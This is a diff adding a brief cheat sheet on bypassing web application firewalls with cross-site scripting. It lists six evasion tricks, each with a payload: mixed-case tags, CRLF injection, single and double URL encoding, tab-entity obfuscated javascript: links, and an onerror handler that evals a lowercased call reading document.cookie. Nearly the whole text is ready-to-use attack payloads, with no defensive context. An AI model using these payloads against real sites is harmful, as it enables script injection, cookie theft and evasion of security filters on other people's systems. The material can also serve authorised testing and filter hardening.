@@ -1,0 +1,19 @@
+How to bypass WAF with XSS?
+
+1. Check if WAF is blocking only lowercase
+<sCRipT>alert(1)</sCRiPt>
+
+2. Try to break regex with a new line (\r\n)
+<script>%0d%0aalert(1)</script>
+
+3. Try URL encoding
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+
+4. Try DOUBLE URL encoding
+%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E
+
+5. Try adding anchor tags (without whitespaces)
+<a/href="j&Tab; a&Tab;v&Tab; asc&Tab; ri&Tab;pt: alert&lpar;1&rpar;">
+
+6. Try capitalizing the alert function
+</textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
